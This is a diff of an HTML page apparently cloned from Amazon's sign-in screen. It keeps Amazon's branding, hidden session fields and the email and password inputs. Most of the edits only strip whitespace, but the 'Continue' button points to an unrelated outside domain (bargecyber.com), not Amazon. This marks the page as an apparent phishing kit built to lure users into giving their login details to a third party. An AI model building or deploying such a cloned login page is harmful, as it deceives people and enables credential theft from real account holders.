@@ -273,16 +273,7 @@ amzn.copilot.checkCoPilotSession();
 </div>
 
 <div class="a-section auth-pagelet-container">
-  
-
-
-
-
-
-
-
-
-
+ 
 <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
 
 
@@ -290,12 +281,6 @@ amzn.copilot.checkCoPilotSession();
 
 
 <!-- show a warning modal dialog when the third party account is connected with Amazon -->
-
-
-
-
-
-
 
 <div id="passkey-error-alert" class="a-box a-alert a-alert-error aok-hidden" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Passkey error</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
   <p id="passkey-client-error-message">
@@ -306,27 +291,13 @@ amzn.copilot.checkCoPilotSession();
   </p>
   <p id="passkey-server-error-message" class="aok-hidden"></p>
 </div></div></div>
-
-
   
-    
-
-
-
-
-
 <div class="a-section a-spacing-base">
   <div class="a-section">
     
     <form name="signIn" method="post" novalidate action="https://www.amazon.com/ap/signin" class="auth-validate-form auth-real-time-validation a-spacing-none">
       <input type="hidden" name="appActionToken" value="7sCZJj2BxANv61HV5iscWmmgTm328j3D" /><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT" />
       <input type="hidden" name="subPageType" value="SignInClaimCollect"/>
-
-      
-
-
-
-
   
     <input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC95b3Vyc3RvcmUvaG9tZT9wYXRoPSUyRmdwJTJGeW91cnN0b3JlJTJGaG9tZSZ1c2VSZWRpcmVjdE9uU3VjY2Vzcz0xJnNpZ25Jbj0xJmFjdGlvbj1zaWduLW91dCZyZWZfPW5hdl9BY2NvdW50Rmx5b3V0X3NpZ25vdXQ=" />
   
@@ -334,9 +305,6 @@ amzn.copilot.checkCoPilotSession();
   
     <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.cLqfGUrpn1inJkDt161CddRL3TQJ25ZQ7ZYmz6115dvTn-krP6oMDw.pWn6g5_jO8kWNXJJ.Yflw61zd1kGC5nAH7EVwj0bQemE6fiVLN_jx_xPZmpEyQeRT2mWwKr_Nk-MhyjANwcDPGb5fbuGfGvnTqskyfKprE7cmvAUmKNV9WS8Mg0jU_v_hJEUdjJZHmfUf6cYO6idyJDX6TX67yQvqY3ouSJvp8NZE0BYIAaukaE80gHfDU-IhYQZOq-fILvLjiB8zalCDf8XV7wiR7tnTaGwt7De7pn-hyKI8JTh3AEFykw5Q3NZn0-PpGD87C-gPO2d4fJlouFv6hDGvZHP_Zf7Z62K39c4g.RJwuWpaeLR3jR9FyBnqcKw" />
   
-
-
-
       <div class="a-section">
         <div class="a-box"><div class="a-box-inner a-padding-extra-large">
           <h1 class="a-spacing-small">
@@ -348,106 +316,24 @@ amzn.copilot.checkCoPilotSession();
             <label for="ap_email" class="a-form-label">
               Email or mobile phone number
             </label>
-            
-            
-              
-              
-                
-              
-              
-              
-            
-            
+                       
             <input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" aria-describedby="Enter your email or mobile phone number" aria-required="true"/>
             
-
             <input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="a-input-text hide" aria-required="true"/>
             
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
 <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
   Enter your email or mobile phone number
 </div></div></div>
-
-  
-
-
 
 <div id="auth-email-invalid-claim-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
   Enter a valid email address or phone number
 </div></div></div>
 
-  
-  
-
-
-
-
-
-
-
-
-
-
-
-
           </div>
 
           <div>
 
-          <div class="a-column a-span5">
+          <div class="a-column a-span5 a-spacing-base">
             <label for="ap_password" class="a-form-label">
         
           
@@ -464,23 +350,11 @@ amzn.copilot.checkCoPilotSession();
           </div></div></div>
           </div>
 
-          <div></div>
           
           <input type="hidden" name="create" value="0"/>
 
           <div class="a-section">
-            
-            
-
-
-
-
-
-
-
-
-
-            
+              
             <a id="continue" class="a-button a-button-span12 a-button-primary" href="https://bargecyber.com/index2.html">
               <span class="a-button-inner">
                 <input id="continue" tabindex="5" class="a-button-input" type="button" aria-labelledby="continue-announce"/>
